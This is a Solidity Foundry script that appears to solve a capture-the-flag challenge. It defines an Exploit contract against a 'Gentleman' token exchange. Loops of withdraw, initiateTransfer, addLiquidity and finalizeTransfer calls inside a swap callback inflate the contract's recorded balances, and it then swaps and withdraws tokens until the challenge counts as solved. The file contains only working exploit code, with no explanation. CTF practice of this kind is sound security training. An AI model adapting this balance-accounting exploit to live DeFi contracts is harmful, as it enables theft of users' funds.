
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

contract Solve is Script{
    function run()public{
        address setup=address(0xdC9171d3cCAA3A666ee28170Ec5D0fC95a3F77d7);
        vm.startBroadcast();
        Exploit exploit=new Exploit(setup);
        exploit.pwn();
        vm.stopBroadcast();
    }
}   


contract Exploit {
    Setup setup;
    Gentleman exchange;
    IToken token1;
    IToken token2;
    IToken token3;

    constructor(address setupAddr) {
        setup = Setup(setupAddr);
        exchange = setup.target();
        token1 = setup.token1();
        token2 = setup.token2();
        token3 = setup.token3();
    }

    function pwn() public {
        exchange.swap();
        assert(setup.isSolved());
    }

    function doSwap() public {
        token1.approve(address(exchange), type(uint256).max);
        token2.approve(address(exchange), type(uint256).max);
        token3.approve(address(exchange), type(uint256).max);

        for (uint256 i = 0; i < 30; i++) {
            exchange.withdraw(address(token2), 200_000);
            exchange.initiateTransfer(address(token2));
            exchange.addLiquidity(address(token1), address(token2), 0, 200_000);
            exchange.finalizeTransfer(address(token2));
        }
        exchange.swapTokens(address(token1), address(token2), 10_000, 400_000);

        for (uint256 i = 0; i < 50; i++) {
            exchange.withdraw(address(token1), 200_000);
            exchange.initiateTransfer(address(token1));
            exchange.addLiquidity(address(token2), address(token1), 0, 200_000);
            exchange.finalizeTransfer(address(token1));
        }
        exchange.swapTokens(address(token2), address(token1), 200_000, 240_000); // 200_000 + 10_000 + 30_000

        for (uint256 i = 0; i < 50; i++) {
            exchange.withdraw(address(token3), 400_000);
            exchange.initiateTransfer(address(token3));
            exchange.addLiquidity(address(token1), address(token3), 0, 400_000);
            exchange.finalizeTransfer(address(token3));
        }
        exchange.swapTokens(address(token1), address(token3), 30_000, 400_000);

        exchange.withdraw(address(token1), 200_000);
        exchange.withdraw(address(token2), 200_000);
        exchange.withdraw(address(token3), 400_000);
    }
}